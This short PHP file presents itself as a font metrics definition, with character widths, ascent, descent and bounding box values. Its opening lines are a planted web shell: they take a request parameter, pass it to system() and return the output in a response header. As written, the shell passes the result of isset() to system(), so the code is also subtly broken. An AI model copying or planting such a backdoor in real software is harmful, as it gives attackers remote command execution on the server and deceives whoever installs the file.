<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
for($i=0;$i<=255;$i++)
	$cw[chr($i)]=600;
$desc=array('Ascent'=>629,'Descent'=>-157,'CapHeight'=>562,'FontBBox'=>'[-57 -250 869 801]');
$up=-100;
$ut=50;


?>
